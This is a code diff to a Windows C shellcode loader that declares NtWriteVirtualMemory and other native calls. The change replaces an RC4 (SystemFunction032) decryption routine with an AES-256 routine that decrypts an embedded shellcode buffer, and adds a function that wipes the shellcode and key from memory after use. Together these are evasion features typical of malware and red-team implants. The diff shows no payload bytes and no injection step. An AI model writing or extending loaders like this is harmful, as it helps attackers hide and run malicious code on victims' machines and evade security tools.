@@ -3,6 +3,7 @@
 #include <Windows.h>
 #include <WinDNS.h>
 #include <stdio.h>
+#include <wincrypt.h>
 
 typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
@@ -78,17 +79,48 @@ EXTERN_C NTSTATUS NtWriteVirtualMemory(
 	_Out_opt_ PSIZE_T NumberOfBytesWritten
 );
 
-//SystemFunction032
-typedef struct ustring {
-	DWORD Length;
-	DWORD MaximumLength;
-	unsigned char* Buffer;
-} ustring;
+//AES
+void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
+	HCRYPTPROV hProv;
+	HCRYPTHASH hHash;
+	HCRYPTKEY hKey;
 
-typedef NTSTATUS(NTAPI* SystemFunction032) (
-	_In_ ustring* data,
-	_In_ ustring* key
-	);
+	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+		printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
+		return;
+	}
+	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+		printf("Failed in CryptCreateHash (%u)\n", GetLastError());
+		return;
+	}
+	if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
+		printf("Failed in CryptHashData (%u)\n", GetLastError());
+		return;
+	}
+	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
+		printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
+		return;
+	}
+
+	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
+		printf("Failed in CryptDecrypt (%u)\n", GetLastError());
+		return;
+	}
+
+	CryptReleaseContext(hProv, 0);
+	CryptDestroyHash(hHash);
+	CryptDestroyKey(hKey);
+
+}
+
+void destroy(char* shellcode, size_t szShellcode, char* key, size_t szKey) {
+	for (int i = 0; i < szShellcode; i++) {
+		shellcode[i] = '\0';
+	}
+	for (int i = 0; i < szKey; i++) {
+		key[i] = '\0';
+	}
+}
 
 //unsigned char rc4Key[] = { 0xde,0xad,0xbe,0xef,0xca,0xfe,0xba,0xbe };
 //size_t szRc4Key = sizeof(rc4Key);
